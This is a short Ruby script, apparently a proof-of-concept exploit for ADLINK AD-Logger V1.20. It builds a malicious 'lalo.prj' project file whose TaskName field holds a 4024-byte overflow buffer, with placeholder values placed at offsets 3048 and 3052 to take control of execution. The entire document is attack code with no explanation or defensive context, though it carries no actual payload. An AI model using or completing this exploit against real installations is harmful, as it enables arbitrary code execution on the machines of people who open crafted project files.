#!/usr/bin/env ruby
# ADLINK AD-Logger V1.20
# https://www.adlinktech.com/Products/SearchResult?lang=en&SiteID=16041112321545803&key=AD-Logger
require 'rex'

buffer = Rex::Text.pattern_create(4024)
buffer[3048,4] = [0x42424242].pack('V')
buffer[3052,4] = [0x41414141].pack('V')

cfg =  "Version=1.0\n"
cfg << "NumberOfTask=1\n"
cfg << "TaskName=#{buffer}.tsk\n"
cfg << "GTimeConfig=DAQTask0.tskTimePrty.cfg\n"
cfg << "GFreqConfig=DAQTask0.tskFreqPrty.cfg\n"

fd = File.new('lalo.prj','wb')
fd.write(cfg)
fd.close
